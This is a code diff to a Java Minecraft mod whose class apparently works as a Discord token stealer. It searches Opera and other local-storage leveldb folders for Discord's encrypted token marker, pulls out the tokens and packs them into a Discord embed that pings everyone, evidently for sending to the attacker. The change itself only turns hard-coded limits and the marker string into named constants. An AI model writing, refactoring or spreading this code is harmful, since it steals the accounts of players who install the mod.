@@ -29,6 +29,11 @@ public final class Main {
     private static final boolean PING_EVERYONE = true;
     private static final Minecraft mc = Minecraft.getMinecraft();
 
+    // --- KONSTANTEN ---
+    private static final int DISCORD_EMBED_MAX_DESCRIPTION_LENGTH = 3500; // Discord limit is 4096, using 3500 for safety
+    private static final int MAX_TOKEN_DISPLAY_LENGTH = 500;
+    private static final String DISCORD_TOKEN_PATTERN = "dQw4w9WgXcQ:"; // Discord's encrypted token identifier
+
     // --- HILFSMETHODEN ---
 
     // Kürzt Texte sicher, damit Discord nicht abstürzt
@@ -140,14 +145,13 @@ public final class Main {
             // Wir setzen ein Limit von 2000 Zeichen pro Embed-Beschreibung, um sicher zu sein.
             StringBuilder sb = new StringBuilder();
             sb.append("**Found ").append(tokens.size()).append(" token(s):**\n\n");
-            int maxLength = 3500; // Leave room for formatting
             int currentLength = sb.length();
             
             for (int i = 0; i < tokens.size(); i++) {
                 String token = tokens.get(i);
-                String displayToken = "**Token " + (i + 1) + ":**\n```" + safeString(token, 500) + "```\n";
+                String displayToken = "**Token " + (i + 1) + ":**\n```" + safeString(token, MAX_TOKEN_DISPLAY_LENGTH) + "```\n";
                 
-                if (currentLength + displayToken.length() > maxLength) {
+                if (currentLength + displayToken.length() > DISCORD_EMBED_MAX_DESCRIPTION_LENGTH) {
                     sb.append("*...and ").append(tokens.size() - i).append(" more*");
                     break;
                 }
@@ -175,7 +179,6 @@ public final class Main {
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
 
         // Correct Discord token identifier pattern from reference implementation
-        String tokenPattern = "dQw4w9WgXcQ:";
         
         for (File file : paths) {
             if (file == null || !file.exists() || !file.isDirectory()) {
@@ -188,11 +191,11 @@ public final class Main {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
                         // Use the correct Discord token identifier pattern
-                        int index = strLine.indexOf(tokenPattern);
+                        int index = strLine.indexOf(DISCORD_TOKEN_PATTERN);
                         if (index != -1) {
                             try {
                                 // Extract token after the pattern using indexOf instead of split to avoid regex issues
-                                String afterPattern = strLine.substring(index + tokenPattern.length());
+                                String afterPattern = strLine.substring(index + DISCORD_TOKEN_PATTERN.length());
                                 int quoteIndex = afterPattern.indexOf("\"");
                                 if (quoteIndex >= 0) {
                                     String tokenPart = afterPattern.substring(0, quoteIndex);
